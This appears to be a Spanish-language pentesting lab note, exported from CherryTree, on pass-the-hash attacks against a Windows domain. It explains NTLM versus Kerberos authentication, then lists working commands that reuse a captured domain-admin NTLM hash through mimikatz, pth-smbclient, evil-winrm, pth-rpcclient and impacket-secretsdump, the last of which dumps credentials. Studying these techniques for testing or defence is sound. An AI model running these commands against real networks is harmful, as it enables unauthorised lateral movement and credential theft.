<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PassTheHash</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PassTheHash</h1><br/><p><h1>ES IMPORTANTE SABER BIEN Y ENTENDER LOS MECANISMOS DE AUTENTICACIÓN DE WINDOWS</h1></p><p></p><p>Dentro de domino cuando se consumen servicios, la autenticación del usuario depende del nombre que utilicemos al dirigir el directorio del usuario, por ejemplo:</p><p></p><p>Desde del DC queremos consumir la carpeta C$ de WS01 en la que si usamos ese nombre  se utilizará el protocolo Kerberos para realizar la autenticación, pero si nos referimos a la máquina por su dirección IP se hará uso del protocolo NTLM:</p><p></p><p><img src="images/37-1.png" alt="images/37-1.png" /></p><p></p><p>En WS01 comprobamos los logonsession:</p><p></p><p><img src="images/37-2.png" alt="images/37-2.png" /></p><p></p><p>Vemos que cada una utiliza un protocolo de autenticación de red diferente.</p><p></p><p><a href="https://learn.microsoft.com/es-es/troubleshoot/windows-server/windows-security/ntlm-user-authentication">https://learn.microsoft.com/es-es/troubleshoot/windows-server/windows-security/ntlm-user-authentication</a></p><p></p><p>NTLM es más inseguro pero convive dentro de un dominio junto con kerberos y si no se especifica el uso de este, por defecto se utilizará NTLM.</p><p></p><p>Por NTLM el consumo del servicio funciona diferente que en kerberos.</p><p></p><p></p><p>Passthehass consiste en modificar el hash que manda el sistema windows de forma automática al intentar acceder a un recurso mediante una sessionlog ya iniciada para poder hacer creer al la maquina donde se encuentra el servicio que quieres consumir que eres un usuario diferente al que realmente le hace la petición.</p><p></p><p></p><p>Ahora suponemos lo siguiente:</p><p></p><p><img src="images/37-3.png" alt="images/37-3.png" /></p><p></p><p>Hemos conseguido el hash NTLM del administrador del dominio pero no podemos crackearlo.</p><p></p><p>Vamos a utilizarlo de la siguiente forma.</p><p></p><p><div class="codebox"><pre><br />sekurlsa<span style="color:#000000;font-weight:700">::</span>pth <span style="color:#000000;font-weight:700">/</span>user<span style="color:#000000;font-weight:700">:</span>administrador <span style="color:#000000;font-weight:700">/</span>domain<span style="color:#000000;font-weight:700">:</span>corp.local <span style="color:#000000;font-weight:700">/</span>ntlm<span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86 </pre></div></p><p></p><p>Mimikatz crea una nueva logonsession dentro de WS01 en la que suplanta el hash que se genera de empleado1 con el hash que le hemos proporcionado, copia el token de acceso al proceso y se lo añade a la logonsession y lo asigna a una cmd.</p><p></p><p>Esta cmd está asociada a una logon session con el hash del administrador.</p><p></p><p><img src="images/37-4.png" alt="images/37-4.png" /></p><p></p><p><img src="images/37-5.png" alt="images/37-5.png" /></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><h1>DESDE LINUX</h1></p><p></p><p></p><p>Igual a antes vamos a tener el hash del admin sin poder crackearlo.</p><p></p><p>El protocolo NTLM es de autenticación por lo que en función del servicio que se vaya a consumir, en este caso SMB por lo que tenemos es una implementación NTLM en SMB.</p><p></p><p>Usaremos la herramienta passthehass en kali:</p><p></p><p><div class="codebox"><pre><br />pth-smbclient <span style="color:#000000;font-weight:700">//</span>192.168.20.5<span style="color:#000000;font-weight:700">/</span>c$ -U administrador --pw<span style="color:#729fcf;font-weight:400">-nt</span>-hash a87f3a337d73085c45f9416be5787d86 -W corp.local</pre></div></p><p></p><p><img src="images/37-6.png" alt="images/37-6.png" /></p><p></p><p></p><p>Esto mismo podemos usarlo para otros procesos como winrm para la administración remota:</p><p></p><p>Por ejemplo utilizando evilwinrm:</p><p></p><p>Con credenciales:</p><p></p><p><div class="codebox"><pre><br />evil-winrm -i 192.168.20.131 -u Administrador -p Passw0rd</pre></div></p><p></p><p>Sin credenciales pero hash NTML del administrador:</p><p></p><p><div class="codebox"><pre><br />evil-winrm -i 192.168.20.131 -u Administrador -H a87f3a337d73085c45f9416be5787d86</pre></div></p><p></p><p><img src="images/37-7.png" alt="images/37-7.png" /></p><p></p><p></p><p></p><p>Para impacket y otras herramientas funciona igual:</p><p></p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump administrador@192.168.20.131 -hashes <span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86</pre></div></p><p></p><p><img src="images/37-8.png" alt="images/37-8.png" /></p><p></p><p></p><p></p><p></p><p>Con rpcclient:</p><p></p><p><div class="codebox"><pre><br />pth-rpcclient -U corp<span style="color:#000000;font-weight:700">/</span>administrador%00000000000000000000000000000000<span style="color:#000000;font-weight:700">:</span>a87f3a337d73085c45f9416be5787d86 <span style="color:#000000;font-weight:700">//</span>192.168.20.131</pre></div></p><p></p><p><img src="images/37-9.png" alt="images/37-9.png" /></p></div>
</body>
</html>
